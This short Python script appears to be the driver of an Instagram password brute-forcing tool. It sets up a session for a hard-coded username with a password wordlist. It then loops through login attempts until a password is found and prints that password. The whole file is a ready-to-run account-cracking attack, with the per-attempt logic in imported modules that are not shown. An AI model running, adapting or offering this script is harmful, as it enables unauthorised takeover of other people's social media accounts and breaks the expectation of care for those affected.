from InstagramPyCLI import InstagramPyCLI
from InstagramPyReports import InstagramPyReports
from InstagramPySession import InstagramPySession,DEFAULT_PATH
from InstagramPy import InstagramPy
from datetime import datetime
from constants import appInfo as AppInformation

REPORTS = InstagramPyReports(AppInformation , True)
SESSION = InstagramPySession('instatestgod__' , 'passwords.lst' , DEFAULT_PATH , DEFAULT_PATH , REPORTS)
SESSION.ReadSaveFile()

CLI = InstagramPyCLI(AppInformation , datetime.now() , SESSION.password_list_length)
INSTAGRAMPY = InstagramPy(cli = CLI , session = SESSION , reports = REPORTS , verbose = True)

while not INSTAGRAMPY.password_found and SESSION.current_line < SESSION.password_list_length:
    INSTAGRAMPY.TryPassword()

CLI.CloseCLI()

if INSTAGRAMPY.password_found == True:
    print('password: {}'.format(SESSION.CurrentPassword()))

exit(1)
